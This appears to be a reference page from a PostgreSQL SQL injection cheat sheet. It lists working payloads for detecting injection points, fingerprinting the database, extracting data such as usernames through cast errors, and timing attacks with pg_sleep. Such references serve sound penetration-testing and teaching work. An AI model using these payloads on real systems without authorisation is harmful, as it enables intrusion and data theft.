---
title: Testing Injection
description: Methods to verify if a PostgreSQL injection point exists
category: Basics
order: 4
tags: ["testing", "basics", "detection"]
lastUpdated: 2025-12-07
---

## Testing for Injection

When testing for SQL injection vulnerabilities in PostgreSQL applications, use these techniques to identify injection points.

### Basic Tests

| Test Payload   | Expected Behavior        |
| -------------- | ------------------------ |
| `'`            | Causes SQL syntax error  |
| `''`           | No error (escaped quote) |
| `' OR '1'='1`  | Always true condition    |
| `' OR '1'='2`  | Always false condition   |
| `' AND '1'='1` | True if injection exists |

### Numeric Injection Tests

For numeric parameters:

```sql
-- Original: SELECT * FROM products WHERE id = 1
1 AND 1=1        -- True, should return same result
1 AND 1=2        -- False, should return different/no result
1-false::int     -- Returns 1 (false = 0)
1-true::int      -- Returns 0 (true = 1)
```

**Note:** PostgreSQL does not implicitly convert booleans to integers in arithmetic expressions. Unlike MySQL where `1-false` works directly, PostgreSQL requires explicit casting (`::int`) or the query fails with "operator does not exist: integer - boolean".

### String Concatenation Tests

PostgreSQL uses `||` for string concatenation:

```sql
-- Original: SELECT * FROM users WHERE name = 'admin'
adm'||'in    -- Should work if injection exists
```

### Boolean-Based Detection

```sql
' AND 1=1--
' AND 1=2--
```

If the first returns results and the second doesn't, injection likely exists.

### PostgreSQL-Specific Tests

Use PostgreSQL-specific syntax to confirm the database type:

```sql
-- PostgreSQL cast shorthand (::type)
' AND 1::int=1--

-- Using CAST function
' AND 1=CAST(1 AS int)--

-- PostgreSQL-specific functions
' AND version() IS NOT NULL--
' AND current_database() IS NOT NULL--
' AND current_schema() IS NOT NULL--
```

The `::type` cast syntax is unique to PostgreSQL and won't work on MySQL or MSSQL.

### Error-Based Detection

Force errors to confirm PostgreSQL:

```sql
-- Basic type conversion error
' AND 1=CAST('a' AS int)--

-- Using :: shorthand
' AND 'a'::int=1--
```

This should produce a PostgreSQL-specific error message indicating the database type.

### Error-Based Data Extraction

Extract data through error messages using type casting:

```sql
-- Extract version via CAST error
' AND 1=CAST((SELECT version()) AS int)--

-- Alternative: using :: syntax
' AND (SELECT version())::int=1--

-- Extract current user
' AND 1=CAST((SELECT current_user) AS int)--

-- Extract database name
' AND 1=CAST((SELECT current_database()) AS int)--

-- Extract with string markers (easier to find in error)
' AND 1=CAST('~'||(SELECT version())||'~' AS NUMERIC)--

-- Extract table data
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The error message will contain the string value that couldn't be converted, revealing the data.

### Time-Based Detection

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5)) IS NOT NULL--
```

If the page takes 5 seconds longer to load, injection exists and PostgreSQL is confirmed.

### Notes

- PostgreSQL is case-sensitive for string comparisons by default
- Always test with both single and double quotes
- Check for error messages that reveal PostgreSQL-specific information
